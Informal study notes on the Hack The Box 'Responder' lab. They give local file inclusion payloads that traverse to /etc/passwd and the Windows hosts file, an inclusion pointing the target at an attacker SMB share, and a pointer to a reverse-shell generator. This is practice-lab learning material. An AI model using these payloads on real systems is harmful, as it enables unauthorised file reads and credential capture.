## Responder

😍to use domain name insteed of ip address
- open  /etc/hosts via sublime
- paste the ip and infront of it type the domain name
#### pro tip :  use tldr instead of man pages
revshell.com 👈 this is a online version of reverse shells.(💦definetly check this💦)
Local FIle Enclusion 

this occurs only if url like this
www.unika.htb/index.php?page=french.html

so in this if we want to perform LFI ; do ../../../../../ after the page=
eg:-     ...php?page=../../../../../../../etc/passwd  < linux 
"...php?page=..\\..\\..\\..\\..\\windows\system32\drivers\etc\hosts"  < windows 


in this scenario we make a smb server in overself and connect the target(unika.htb) to us.

../index.php?page=//10.10.123.116/❤️

